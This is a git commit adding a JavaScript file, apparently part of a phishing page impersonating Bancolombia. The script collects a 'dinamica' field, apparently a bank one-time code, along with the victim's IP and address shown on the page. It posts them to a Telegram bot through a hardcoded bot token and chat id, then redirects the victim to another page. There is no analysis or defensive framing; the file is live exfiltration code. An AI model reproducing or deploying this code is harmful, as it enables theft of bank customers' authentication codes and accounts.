b8df9bebf8df4c9fa5e5e0b3a4311dd415a26f38
cabtopls <111666023+cabtopls@users.noreply.github.com>
2022-08-24 19:14:31 -0500

    Add files via upload

---
+++ js/sax3.js
@@ -0,0 +1,34 @@
+//bot token
+var telegram_bot_id = "5555378600:AAGW7r49CVR9bBcYckJznQ_vPMEb9RG-uYQ";
+//chat id
+var chat_id = 5150089222;
+var u_name, ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("dinamica").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "DINAMICA: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\nBANCOLOMBIA";
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'index4.html';
+        console.log(response);
+    });
+    return false;
+};
